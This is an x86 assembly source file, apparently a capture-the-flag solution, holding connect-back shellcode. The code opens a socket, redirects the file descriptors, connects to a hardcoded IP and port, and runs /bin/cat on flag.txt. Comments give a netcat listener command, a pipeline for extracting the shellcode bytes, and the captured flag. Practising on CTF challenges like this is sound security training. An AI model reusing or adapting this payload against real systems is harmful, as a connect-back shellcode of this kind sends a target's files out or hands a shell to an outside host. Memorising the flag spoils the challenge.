.intel_syntax noprefix

.section .text
.global _start

######## MY ADDRESS INFO ######## (tester3.kaist.ac.kr)
## IP: 143.248.136.13
## PORT: 55555
#################################

######## MY ADDRESS INFO in HEX ########
## IP: "\x8f\xf8\x88\x0d"
## PORT: "\xd9\x03"
########################################

# nc 143.248.38.212 30000
# gcc -nostdlib -g -m32 problem3d.s -o problem3d

# cmd to get hex from executable
# objdump -d problem3d | grep '[0-9a-f]:' | grep -oP '\s\K([0-9a-f]{2} )+' | tr -d ' \n' | sed 's/\(..\)/\\x\1/g'

# cmd to execute in local machine
# nc -lvnp 55555

# flag: SKCTF{y0u_5p4wn3d_4_x86_5h3ll}

_start: 
    # Set up the destination IP address (143.248.136.13 in hex: 0x8ff8880d).
    push   0xd88f88f
    pop    esi

    # Set up the destination port (55555 in hex: 0xd903).
    pushw  0x3d9
    pop    edi

    # Create a socket (socketcall syscall - syscall number 0x66 in eax)
    push   0x66
    pop    eax
    cdq

    # Set up the arguments for the socket creation.
    # Push 1 (SOCK_STREAM, for TCP) onto the stack.
    push   0x1            
    pop    ebx
    # Push 0 (protocol argument, set to 0) onto the stack.
    push   edx
    # Push `ebx` (1) again (socket type).
    push   ebx
    # Push 2 (AF_INET, for IPv4) onto the stack.
    push   0x2


# System call to create the socket.
syscall_socket:
    # Set `ecx` to point to the arguments (AF_INET, SOCK_STREAM, 0).
    mov    ecx,esp        
    int    0x80
    # Exchange `ebx` and `eax` (store socket file descriptor in `ebx`).
    xchg   ebx,eax
    pop    ecx


# Duplicate the socket file descriptor (dup2 syscall - used to redirect input/output).
duplicate_fd:
    mov    al,0x3f
    int    0x80
    dec    ecx
    jns    duplicate_fd

    # Connect the socket to the specified address and port.
    mov    al,0x66
    # ip address and port pushed
    push   esi
    push   di
    # Push 2 (AF_INET, for IPv4) onto the stack.
    pushw  0x2
    mov    ecx,esp
    # Push 16 (size of the sockaddr_in structure) onto the stack.
    push   0x10
    # Push the pointer to the sockaddr_in structure.
    push   ecx
    # Push the socket file descriptor.
    push   ebx
    # Set `ecx` to point to the arguments for the connect syscall.
    mov    ecx,esp
    int    0x80



    # Execve syscall to spawn /bin/cat flag.txt
    xor eax, eax
    
    # Push "/bin/cat" onto the stack (including the null terminator)
    push eax
    push 0x7461632f     # "cat/"
    push 0x6e69622f     # "bin/"
    mov ebx, esp        # Store pointer to "/bin/cat"
    
    # Push "flag.txt" onto the stack (including the null terminator)
    push eax
    push 0x7478742e     # "txt."
    push 0x67616c66     # "flag"
    mov ecx, esp
    
    # set up argv array (pointers to "/bin/cat" and "flag.txt", followed by NULL)
    push eax    # NULL for argv[2]
    push ecx    # Pointer to "flag.txt" (argv[1])
    push ebx    # Pointer to "/bin/cat" (argv[0])
    
    # ECX now points to the argv array: {"/bin/cat", "flag.txt", NULL}
    mov ecx, esp
    # EDX = envp = NULL (no environment variables)
    xor edx, edx
    
    # EBX should point to the filename ("/bin/cat")
    mov ebx, [ecx]
    # execve syscall number (11)
    mov eax, 0xb
    int 0x80
    
